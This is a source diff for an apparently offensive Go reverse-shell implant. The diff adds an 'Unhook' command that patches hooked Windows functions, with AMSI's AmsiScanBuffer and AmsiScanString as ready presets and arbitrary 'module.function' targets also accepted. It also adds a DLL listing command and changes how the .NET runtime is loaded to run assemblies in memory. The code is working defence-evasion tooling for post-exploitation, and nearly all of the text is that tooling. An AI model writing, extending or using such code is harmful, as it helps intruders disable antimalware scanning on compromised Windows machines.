@@ -1,8 +1,11 @@
 package cmds
 
 import (
+	"encoding/json"
 	"fmt"
+	"io"
 	"os"
+	"strings"
 
 	"github.com/audibleblink/gorsh/internal/execute_assembly"
 
@@ -20,16 +23,20 @@ func UnloadAssembly(c *ishell.Context) {
 }
 
 func LoadAssembly(c *ishell.Context) {
-	if len(c.Args) != 1 {
-		c.Println("must provide assembly name to load")
+	if len(c.Args) == 0 {
+		assys := c.Cmd.Completer([]string{})
+		for _, assy := range assys {
+			c.Println(assy)
+		}
 		return
 	}
 
 	name := c.Args[0]
-
 	var err error
-	if clr == (execute_assembly.CLR{}) {
+
+	if !clr.IsLoaded() {
 		clr, err = execute_assembly.NewCLR()
+		clr, err = clr.LoadCLR() //HACK
 		if err != nil {
 			c.Printf("could not load clr: %v\n", err)
 			return
@@ -63,40 +70,68 @@ func ChangePrompt(c *ishell.Context, module string) {
 	c.SetPrompt(fmt.Sprintf("[%s] %s > ", GetHostname(), module))
 }
 
-func Amsi(c *ishell.Context) {
-	unhook := false
-	if len(c.Args) > 0 && c.Args[0] == "unhook" {
-		unhook = true
+func ListDlls(c *ishell.Context) {
+	dlls, err := execute_assembly.ListDll()
+	if err != nil {
+		c.Println(err)
+		return
 	}
 
-	fns := []string{
+	for _, dll := range dlls {
+		c.Println(dll)
+	}
+}
+
+func Unhook(c *ishell.Context) {
+
+	defs := make(map[string][]string)
+	defs["amsi"] = []string{
 		"AmsiScanBuffer",
 		"AmsiScanString",
 	}
 
-	for _, fn := range fns {
-		hasAmsi, err := execute_assembly.HasAmsi(fn)
-		if err != nil {
-			c.Printf("failed to check for amsi: %v\n", err)
-			return
-		}
-		if hasAmsi {
-			c.Printf("found %s\n", fn)
-			if unhook {
-				dll, err := execute_assembly.UnhookFunction("amsi.dll", fn)
-				if err != nil {
-					c.Printf("failed to unhook %s: %v\n", fn, err)
-					continue
-				}
-				c.Printf(
-					"unhooked %s at : 0x%08x + 0x%04x = 0x%08x\n",
-					fn, dll.DllBaseAddr, dll.FuncOffset, dll.FuncAddress)
+	defs["version"] = []string{
+		"VerifyVersionInfoA",
+		"VerifyVersionInfoW",
+	}
+
+	if len(c.Args) == 0 {
+		c.Println("Choices:\n")
+		b, _ := json.MarshalIndent(defs, "", " ")
+		c.Println(string(b))
+		c.Println("\nOr 'modname.procname'")
+		return
+	}
+
+	unhook := func(module string) func(string) {
+		return func(fn string) {
+			dll, err := execute_assembly.UnhookFunction(module, fn)
+			if err == io.EOF {
+				c.Println("nothing to unhook")
+				return
 			}
-		} else {
-			c.Printf("%s is unhooked\n", fn)
+			if err != nil {
+				c.Printf("failed to unhook %s: %v\n", fn, err)
+				return
+			}
+			c.Printf(
+				"unhooked %s at : 0x%08x + 0x%04x = 0x%08x\n",
+				fn, dll.DllBaseAddr, dll.FuncOffset, dll.FuncAddress,
+			)
 		}
 	}
 
+	choice := defs[c.Args[0]]
+
+	if choice != nil {
+		modUnhook := unhook(c.Args[0])
+		for _, fn := range choice {
+			modUnhook(fn)
+		}
+	} else {
+		arg := strings.Split(c.Args[0], ".")
+		unhook(fmt.Sprintf("%s.dll", arg[0]))(arg[1])
+	}
 }
 
 func GetHostname() string {
